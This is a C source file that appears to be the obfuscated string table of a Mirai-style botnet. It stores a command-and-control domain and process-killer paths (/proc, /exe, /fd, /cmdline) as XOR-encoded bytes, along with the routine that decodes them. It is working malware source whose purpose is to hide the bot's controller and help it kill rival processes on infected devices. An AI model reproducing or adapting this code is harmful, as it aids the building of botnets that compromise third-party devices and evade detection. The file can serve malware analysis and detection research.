#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_keys[] = {
    0x56067593, 0x5bddfd0a, 0xfdf5422
};

struct table_value table[TABLE_MAX_KEYS];

void table_init(void) {

    add_entry(TABLE_CNC_DOMAIN, "\x2\x5\xf\x53\x4f\x5\x14\x2\x52\xa\x4f\x2\xe\xc", 14);
    add_entry(TABLE_EXEC_SUCCESS, "\x22\x2e\x2f\x25\x28\x3e\x34\x31\x25\x20\x35\x24\x3e\x25\x2e\x2f\x24", 17);

    add_entry(TABLE_KILLER_PROC, "\x4e\x11\x13\xe\x2\x4e", 6);
    add_entry(TABLE_KILLER_EXE, "\x4e\x4\x19\x4", 4);
    add_entry(TABLE_KILLER_FD, "\x4e\x7\x5", 3);
    add_entry(TABLE_KILLER_CMDLINE, "\x4e\x2\xc\x5\xd\x8\xf\x4", 8);

}

void table_unlock_val(uint8_t id) {
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked) {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id) {
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked) {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len) {
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked) {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len) {
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

/* lets make an epic obfuscator with 20 table keys because we're rich */
static void toggle_obf(uint8_t id) {
    struct table_value *val = &table[id];

    /* little cpu intensive gagagagaa */
    for (int i = 0; i < TABLE_KEY_LEN; i++) {

        uint32_t table_key = table_keys[i];

        uint8_t k1 = table_key & 0xff,
                k2 = (table_key >> 8) & 0xff,
                k3 = (table_key >> 16) & 0xff,
                k4 = (table_key >> 24) & 0xff;

        for (int i = 0; i < val->val_len; i++) {
            val->val[i] ^= k1;
            val->val[i] ^= k2;
            val->val[i] ^= k3;
            val->val[i] ^= k4;
        }
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
